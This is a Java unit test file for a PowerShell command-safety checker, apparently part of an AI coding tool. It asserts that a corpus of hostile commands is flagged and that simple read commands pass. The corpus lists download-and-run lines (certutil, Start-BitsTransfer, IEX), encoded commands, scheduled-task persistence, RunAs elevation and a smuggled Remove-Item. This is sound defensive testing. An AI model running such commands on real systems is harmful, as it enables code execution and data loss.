package com.claudecode.tools.powershell;

import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertNull;

import org.junit.jupiter.api.Test;


class PowerShellSecurityTest {

    @Test
    void dangerousCorpusNeverPassesLexicalFallback() {
        String[] corpus = {
            "Invoke-Expression $payload",
            "& $command",
            "pwsh -EncodedCommand AAAA",
            "Get-Content x | IEX",
            "Start-BitsTransfer -Source https://example.test/a",
            "certutil -urlcache -split -f https://example.test/a a",
            "New-Object -ComObject WScript.Shell",
            "New-Object System.Diagnostics.Process",
            "Invoke-Command -FilePath ./payload.ps1",
            "Start-Job ./payload.ps1",
            "Get-Process | ForEach-Object -MemberName Kill",
            "Get-Process | ForEach-Object Kill",
            "Start-Process pwsh -ArgumentList '-e AAAA'",
            "Start-Process cmd -Verb RunAs",
            "Invoke-Item ./payload.ps1",
            "Register-ScheduledTask -TaskName bad",
            "schtasks /create /tn bad /tr cmd.exe",
            "Get-Content file | ForEach-Object { $_.Length }",
            "Get-Content $(Get-Item secret)",
            "Get-Content file --% ; Remove-Item secret",
            "Get-Process | ForEach-Object { $_.Kill() }",
            "[System.Diagnostics.Process]::Start('x')",
            "Set-Content env:HOME x",
            "Import-Module ./payload.psm1",
            "Set-Alias Get-Content Invoke-Expression",
            "Invoke-CimMethod -ClassName Win32_Process -MethodName Create",
        };

        for (String command : corpus) {
            assertNotNull(PowerShellSecurity.concern(command), command);
        }
    }

    @Test
    void simpleLiteralReadCommandsHaveNoLexicalConcern() {
        assertNull(PowerShellSecurity.concern("Get-Content ./notes.txt"));
        assertNull(PowerShellSecurity.concern("Get-ChildItem -LiteralPath ./src"));
        assertNull(PowerShellSecurity.concern("Get-Process | Select-Object Name"));
    }

    @Test
    void malformedAndControlInputFailsClosed() {
        assertNotNull(PowerShellSecurity.concern("Get-Content 'unterminated"));
        assertNotNull(PowerShellSecurity.concern("Get-Content \u0001"));
        assertNotNull(PowerShellSecurity.concern("Get-Content |"));
    }

    @Test
    void recognizesEveryPowerShellEncodedCommandPrefix() {
        for (String prefix : new String[] {"-", "/", "\u2013", "\u2014", "\u2015"}) {
            assertNotNull(PowerShellSecurity.concern("pwsh " + prefix + "enc AAAA"), prefix);
        }
    }

    @Test
    void recognizesSimpleAndCompoundAssignments() {
        for (String operator : new String[] {"=", "+=", "-=", "*=", "/=", "%=", "??="}) {
            assertNotNull(PowerShellSecurity.concern("$value " + operator + " 1"), operator);
        }
    }

    @Test
    void recognizesMemberIndexAndStaticInvocationForms() {
        assertNotNull(PowerShellSecurity.concern("$process.Kill()"));
        assertNotNull(PowerShellSecurity.concern("$items[0]"));
        assertNotNull(PowerShellSecurity.concern("[System.Console]::WriteLine('x')"));
    }
}
